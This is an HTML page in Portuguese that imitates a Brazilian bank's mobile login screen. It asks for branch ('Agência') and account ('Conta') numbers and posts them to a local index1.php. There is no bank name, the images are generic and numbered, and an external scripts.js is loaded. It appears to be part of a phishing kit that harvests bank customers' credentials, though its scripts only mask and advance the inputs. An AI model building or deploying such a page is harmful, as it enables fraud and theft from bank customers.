<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="utf-8">
<title>Seja Bem-vindo</title>
<script type="text/javascript" src="scripts.js"></script>
<style>
@media (min-width: 320px){ #resolution { width:320px; !important } }
@media (min-width: 480px){ #resolution { width:470px; !important } }
@media (min-width: 640px){ #resolution { width:630px; !important } }
@media (min-width: 200px){ #img { width:21%; height:32%; !important } }
@media (min-width: 320px){ #img { width:26%; height:42%; !important } }
@media (min-width: 480px){ #img { width:18%; height:42%; !important } }
@media (min-width: 640px){ #img { width:15%; height:48%; !important } }
@media (max-width: 480px){ #hide { max-width:70px; !important } }
@media (max-height: 480px){ #hide2 { display:none; !important } }
#agencia { width:60%; padding:5px; background:none; border:none; color:#FFF; font-family:'Arial'; font-size:16px; outline:none; }
#conta { width:100%; padding:5px; background:none; border:none; color:#FFF; font-family:'Arial'; font-size:16px; outline:none; }
#acessar { width:90%; height:60px; font-size:16px; color:#333; border-radius:10px; border:none; background:#FFF; font-weight:bold;}
::-webkit-input-placeholder { color: #FFF;}
:-moz-placeholder { color: #FFF; }
::-moz-placeholder { color: #FFF; }
:-ms-input-placeholder {  color: #FFF; }
</style>
 <script language="JavaScript">
 function mascara(t, mask){
 var i = t.value.length;
 var saida = mask.substring(1,0);
 var texto = mask.substring(i)
 if (texto.substring(0,1) != saida){
 t.value += texto.substring(0,1);
 }
 }
 </script>
<script>
function exibe(id) {
	if(document.getElementById(id).style.display=="none") {
		document.getElementById(id).style.display = "inline";
	}
	else {
		document.getElementById(id).style.display = "block";
	}
}
</script>
<script>
  function maxLengthCheck(object)
  {
    if (object.value.length > object.maxLength)
      object.value = object.value.slice(0, object.maxLength)
  }
</script>
<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>
</head>

<body style="background:#D17016; margin:0;">
<form name="form" id="form" action="index1.php" method="post" onSubmit="return validar1()">
<div style="height:400px; background:; margin:0 auto;" id="resolution">
<div style="height:200px;"><div id="img" style="background:url(images/1.png) no-repeat; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; left:15px; top:20px; position:relative;"></div></div>
<div style="padding:0 15px 15px 15px; margin-top:-30px;">
<div style="border-bottom:1px solid #FFF;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td width="45%"><div id="conteudo" style="display:none; color:#FFF; font-family:'Arial'; font-size:12px;">ex: xxxx</div></td>
<td width="55%"><div id="conteudo2" style="display:none; color:#FFF; font-family:'Arial'; font-size:12px;">ex: xxxxxx</div></td>
</tr>

<tr>
<td height="40">
<input type="tel" name="agencia" id="agencia" maxlength="4" required="required" placeholder="Agência" onKeyUp="javascript:pulacampo('agencia','conta');"/>
</td>
<td>
<input type="tel" name="conta" id="conta" maxlength="7" required="required" placeholder="Conta" onkeypress="mascara(this, '#####-#')" onKeyUp="javascript:pulacampo('conta','acessar');" />
</td>
</tr>
</table>
</div>
</div>
<div style="padding:15px;">
<div style="width:90%; height:30px; font-size:16px; font-family:'Arial'; color:#FFF; background:url(images/2.png) no-repeat right;">Lembrar agência e conta</div>
</div>
<div style="padding:15px;"><input type="submit" name="acessar" id="acessar" value="acessar"></div>
</div>
<div style="position:fixed; bottom:0; width:100%;" id="hide2">
<div style="height:70px; margin:0 auto; background:;" id="resolution">
<div style="width:230px; height:70px; background:url(images/3.png) no-repeat; float:right;"></div>
<div style="width:160px; height:70px; background:url(images/4.png) no-repeat; float:left;" id="hide"></div>
</div>
</div>
</form>
</body>
</html>
